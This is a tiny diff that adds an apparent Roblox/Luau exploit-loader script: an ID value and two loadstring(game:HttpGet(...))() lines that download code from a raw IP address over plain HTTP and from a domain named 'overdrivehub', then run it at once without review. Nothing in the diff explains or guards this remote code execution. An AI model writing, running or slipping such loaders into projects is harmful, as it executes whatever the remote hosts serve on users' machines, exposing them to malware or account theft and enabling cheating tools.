@@ -1,0 +1,4 @@
+ID="4baf63e7-3a65-4fa7-9f66-ed4c79dd6012";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+
+loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
